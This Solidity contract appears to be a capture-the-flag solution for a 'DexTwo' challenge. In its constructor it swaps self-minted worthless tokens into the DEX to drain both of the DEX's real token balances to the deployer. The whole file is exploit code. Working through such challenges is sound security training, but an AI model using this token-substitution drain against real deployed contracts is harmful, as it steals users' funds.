pragma solidity 0.8.15;

import "../challenge/Dex2.sol";
contract Dex2Attacker {
    constructor(address target) {
        DexTwo dex = DexTwo(target);
        SwappableTokenTwo attackerToken1 = new SwappableTokenTwo(target, "Attacker Token 1", "TKNA1", 1_000_000);
        SwappableTokenTwo token1 = SwappableTokenTwo(dex.token1());
        attackerToken1.transfer(target, 100);
        attackerToken1.approve(target, 100);
        dex.swap(address(attackerToken1), address(token1), 100);
        token1.transfer(msg.sender, token1.balanceOf(address(this)));
        SwappableTokenTwo attackerToken2 = new SwappableTokenTwo(target, "Attacker Token 2", "TKNA2", 1_000_000);
        SwappableTokenTwo token2 = SwappableTokenTwo(dex.token2());
        attackerToken2.transfer(target, 100);
        attackerToken2.approve(target, 100);
        dex.swap(address(attackerToken2), address(token2), 100);
        token2.transfer(msg.sender, token2.balanceOf(address(this)));
    }
}